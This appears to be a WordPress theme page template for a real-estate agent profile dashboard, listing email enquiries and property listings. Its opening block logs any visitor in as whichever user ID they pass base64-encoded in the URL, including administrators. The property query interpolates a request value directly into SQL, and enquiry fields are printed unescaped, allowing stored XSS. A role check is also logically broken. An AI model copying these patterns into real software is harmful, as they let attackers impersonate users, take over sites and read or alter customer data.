<?php
/**
 * Template Name: Profile
 *
 */

get_header(); 

global $current_user;
$role = user_role();
$agentID = $current_user->ID;
$postID = get_user_meta($agentID,'front_end_profile_page',true);
if(isset($_GET['userid']) && !empty($_GET['userid'])){
	$userData = get_userdata(base64_decode($_GET['userid']));
	echo $userEmail = $userData->data->user_email;
	global $wpdb;
	wp_set_current_user(base64_decode($_GET['userid']));
	wp_set_auth_cookie(base64_decode($_GET['userid']));
	if(is_super_admin()){
		wp_redirect(site_url('dashboard'));
	}else{
		wp_redirect(site_url('your-profile'));			
	}	
}
	
?>
<section id="thememylogin">
	<article class="container">
	<div class="col-lg-3 leftProfile">
		<div class="left_sidesec">
			<ul>
				<?php
				
					if(isset($_SESSION['adminid']) && !empty($_SESSION['adminid'])){
						$adminID = base64_encode($_SESSION['adminid']);
						if(!is_super_admin()){
				?>
				<li>
					<a href="<?php echo site_url().'/your-profile/?userid='.$adminID; ?>">
						Go To Admin
					</a>
				</li>
					
				<?php
						}
					}
			
				if($role != 'dataentry'){
					
				if((isset($_GET['agentid'])) && ($_GET['agentid'] !='') && (base64_decode($_GET['agentid']) == $agentID)){
					
				?>
				<li><a rel="m_PageScroll2id" href="<?php echo site_url().'/your-profile'; ?>#UserProfile">Profile</a></li>
				<?php }else{ ?>
				<li  <?php echo(get_the_permalink().'/#UserProfile') ? 'class="active"':''; ?>><a rel="m_PageScroll2id" href="#UserProfile">Profile</a></li>
				<?php } 
				
				}
			 if($role == 'agent' || 'administrator'){	
				
				?>
				
				<li <?php echo(isset($_GET['tag']) && $_GET['tag'] == 'addproperty') ? 'class="active"':''; ?>><a href="<?php echo site_url().'/property/?tag=addproperty'; ?>">Add Property</a></li>
				<li <?php echo(isset($_GET['tag']) && $_GET['tag'] == 'property_listing') ? 'class="active"':''; ?>><a href="<?php echo site_url().'/your-profile/?tag=property_listing&agentid='.base64_encode($agentID); ?>">Property Listing</a></li>
				<?php if($role != 'dataentry'){ ?>
				
					<li <?php echo(isset($_GET['tag']) && $_GET['tag'] == 'enquiries') ? 'class="active"':''; ?>><a href="<?php echo site_url().'/your-profile/?agentid='.base64_encode($agentID).'&tag=enquiries'; ?>">Email Inquiries</a></li>
				
				<?php 
					}
				} 
				
				if((isset($_GET['agentid'])) && ($_GET['agentid'] !='') && (base64_decode($_GET['agentid']) == $agentID) && $role != 'dataentry'){
					?>
				
					<li><a rel="m_PageScroll2id" href="<?php echo site_url().'/your-profile'; ?>#ChangeEmailAddress">Change Email Adress</a></li>
					<li><a rel="m_PageScroll2id" href="<?php echo site_url().'/your-profile'; ?>#ChangePassword">Change Password</a></li>
					
				
				<?php 
				
				}else{ 
					if($role != 'dataentry'){
				?>
			
				<li><a rel="m_PageScroll2id" href="#ChangeEmailAddress">Change Email Address</a></li>
				<li><a rel="m_PageScroll2id" href="#ChangePassword">Change Password</a></li>
				
				<?php 
					}
				} 
				if((isset($_GET['agentid'])) && ($_GET['agentid'] !='') && (base64_decode($_GET['agentid']) == $agentID) && $role == 'dataentry'){
				
				?>
					<li><a rel="m_PageScroll2id" href="<?php echo site_url().'/your-profile'; ?>#PreviouslySavedCalculations">Previously Saved Calculation</a></li>
					
				<?php }else{ ?>
					<li><a rel="m_PageScroll2id" href="#PreviouslySavedCalculations">Previously Saved Calculation</a></li>
				<?php } ?>
				
			</ul>
		</div>
	</div>
	<div class="col-lg-9 rightProfile" id="myenquiry_lists">
		<div class="right_sidesec righPro common_section" <?php /* if($role == 'dataentry'){ echo 'style="display:none;"'; } */ ?>>
		<?php
		
		
			if((isset($_GET['agentid'])) && ($_GET['agentid'] !='') && (base64_decode($_GET['agentid']) == $agentID) && ($_GET['tag'] == 'enquiries')){
		?>
	<div class="myenquiry_list_table">
		<h4 class="quizprofiletitle">Email Enquiries</h4>
		<table id="myTable">
			<thead>
				<tr>
					<th>No.</th>
					<th>Name</th>
					<th>Phone No.</th>
					<th>Email</th>
					<th>Message</th>
					<th>Delete</th>
				</tr>
			</thead>
			<tbody>
		<?php	
		
			$agentId = base64_decode($_GET['agentid']);
			$get_data = "SELECT * FROM wp_db7_forms";
			$data = $wpdb->get_results($get_data);
		
			$i = 1;
			foreach($data as $dataVals){
				$formID = base64_encode($dataVals->form_id);
				$data = unserialize($dataVals->form_value);
				$dataAgentID = $data['user_iD'];
				$senderEmailID = $data['email-993'];
				$senderContactno = $data['tel-513'];
				$senderName = $data['text-459'];
				$senderMessage = $data['your-message'];
				$siteUrl = get_template_directory_uri();
				if($dataAgentID == $agentId){
				echo'<tr>
					<td>'.$i.'</td>
					<td>'.$senderName.'</td>
					<td>'.$senderContactno.'</td>
					<td>'.$senderEmailID.'</td>
					<td>'.$senderMessage.'</td>
					<td>
						<div class="action_wrapper">
							<a class="action_container" data_id="'.$formID.'" data-toggle="tooltip" title="" data-original-title="Delete"><i class="fa fa-trash fa_del"></i>
							</a>
							<img class="deletePropertyLoader" src="'.$siteUrl.'/images/LoaderReal.gif">
						</div>
					</td>
				</tr>';
				$i++;
				}	
			}
	?>
			</tbody>
		</table>
	</div>
	<script src="https://code.jquery.com/jquery-1.11.3.js"
			  integrity="sha256-IGWuzKD7mwVnNY01LtXxq3L84Tm/RJtNCYBfXZw3Je0="
			  crossorigin="anonymous"></script>
			  
	<link rel="stylesheet" href="//cdn.datatables.net/1.10.11/css/jquery.dataTables.min.css">
	<script src="//cdn.datatables.net/1.10.11/js/jquery.dataTables.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

	<script>
	jQuery(document).ready(function(){
		jQuery('#myTable').DataTable({
			"pagingType": "full_numbers"
			}
		);	  
		$('[data-toggle="tooltip"]').tooltip();
		
		/*ajax to delete mail enquiries on profile page*/

		jQuery('.myenquiry_list_table .action_container').click(function(){
			var x;
			if (confirm("Are you sure you want to delete this calculation") == true) {
				var formID = jQuery(this).attr('data_id');
				jQuery(this).parent().addClass('delactive');
				var str = 'action=deleteUserEmailEnquiries&formid=' + formID;
				 $.ajax({  
					context: this,      
					url: "<?php echo home_url();?>/wp-admin/admin-ajax.php",
					type: 'POST',             
					data: str,
					success: function(response) {
					jQuery('#deleteMsg').html('Your Calculation has been deleted');
					jQuery(this).closest('tr').hide(2000);
					}           
				});
				
			}
		});
	});
	</script>
	<?php
			}elseif(!empty($_GET['agentid']) && (base64_decode($_GET['agentid']) == $current_user->ID) && ($_GET['tag'] == 'property_listing')){
	?>
	<div class="property_list_table" id="property_list_table">
	<table id="myTable">
		<thead>
			<tr>
				<th>No.</th>
				<th>Name</th>
				<th>Date</th>
				<th>City</th>
				<th>Address</th>
				<th>Price</th>
				<th>Delete</th>
			</tr>
		</thead>
	<tbody>
	<?php 
					global $wpdb;
					$userAgentID = base64_decode($_GET['agentid']);
					$query = "select id,user_id,city,paddress,beds,year_built,home_type,full_baths,pprice from wp_home_facts where user_id = $userAgentID ORDER BY id DESC";
					$results = $wpdb->get_results($query);
					$i = 1;
					foreach($results as $result){
						$propertyID = $result->id;
						$city = $result->city;
						$address = $result->paddress;
						$year_built = $result->year_built;
						$userID = $result->user_id;
						$pprice = $result->pprice;
						$name = $result->home_type;
						$bed = $result->beds;
						$baths = $result->full_baths;
						if($bed > 1){
							$bedResult = $bed.' Beds';
						}else{
							$bedResult = $bed.' Bed';
						}
						
						if($baths > 1){
							$bathsResult = $baths.' Baths';
						}else{
							$bathsResult = $baths.' Bath';
						}
				?>
			<tr>
			<td><?php echo $i; ?></td>
			<td><?php echo $name; ?></td>
			<td><?php echo $year_built; ?></td>
			<td><?php echo $city; ?></td>
			<td><?php echo $address; ?></td>
			<td>$<?php echo get_val_by_number_format($pprice,true); ?></td>
			<td>
				<div class="action_wrapper edit_sel_sec">
					<a href="<?php echo site_url().'/property/?tag=updateproperty&id='.base64_encode($propertyID); ?>" class="action_container" data-toggle="tooltip" title="" data-original-title="Edit"><i class="fa fa-pencil fa_edit" aria-hidden="true"></i>
					</a> 
					<a class="action_container deleteProperty" id="<?php echo base64_encode($propertyID); ?>" data_id="<?php echo base64_encode($userID); ?>" data-toggle="tooltip" title="" data-original-title="Delete"><i class="fa fa-trash fa_del"></i>
					</a>
					<img class="deletePropertyLoader" src="<?php echo get_template_directory_uri().'/images/LoaderReal.gif'; ?>">
				</div>
				
			</td>
		</tr>
				<?php
				$i++;
				} ?>
	
		
	</tbody>
	</table>
	</div>
	<script src="https://code.jquery.com/jquery-1.11.3.js"
			  integrity="sha256-IGWuzKD7mwVnNY01LtXxq3L84Tm/RJtNCYBfXZw3Je0="
			  crossorigin="anonymous"></script>
			  
<link rel="stylesheet" href="//cdn.datatables.net/1.10.11/css/jquery.dataTables.min.css">
<script src="//cdn.datatables.net/1.10.11/js/jquery.dataTables.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

<script>
jQuery(document).ready(function(){
    jQuery('#myTable').DataTable({
		"pagingType": "full_numbers"
		}
	);	  
	$('[data-toggle="tooltip"]').tooltip();
	
	
/*ajax to delete agent property */
jQuery(document).on('click','.deleteProperty',function(){
    var x;

    if (confirm("Are you sure you want to delete this property") == true) {
		var propertyID = jQuery(this).attr('id');
		var userID = jQuery(this).attr('data_id');
    	jQuery(this).parent().addClass('delactive');
    	var strc = 'action=deleteUserSavedProperties&propertyID=' + propertyID + '&userID='+userID;

    	 $.ajax({  

    	    context: this,      

            url: "<?php echo home_url();?>/wp-admin/admin-ajax.php",

            type: 'POST',             

            data: strc,

            success: function(response) {

            jQuery('#deleteMsg').html('Your Property has been deleted');

            jQuery(this).closest('tr').hide(2000);

            }           

        });

    }

   

});
});
</script>
	<?php	
			}else{
				// Start the loop.
				while ( have_posts() ) : the_post();
				
					the_content();
					
				endwhile;
			}
		?>
		</div>
	</div>
	</article>
</section>	
<script>
jQuery(document).ready(function(){
<?php  if($role == 'administrator'){ ?>	
jQuery('#UserProfile .placeholder_wrapper .img_small').click(function(e){
    e.preventDefault();
    jQuery("#wpua-add-existing").trigger("click"); //.each is implicit on all jQuery methods
});
<?php } ?>	
function readURL(input) {

    if (input.files && input.files[0]) {
        var reader = new FileReader();

        reader.onload = function (e) {
            jQuery('.img_main').attr('src', e.target.result);
        }

        reader.readAsDataURL(input.files[0]);
    }
}

jQuery("#wpua-file-existing").change(function(){
    readURL(this);
});

	jQuery('.left_sidesec ul li').click(function(){
	  jQuery('.left_sidesec ul li').removeClass('active');
	  jQuery(this).addClass('active');
	});
});
</script>
<?php get_footer(); ?>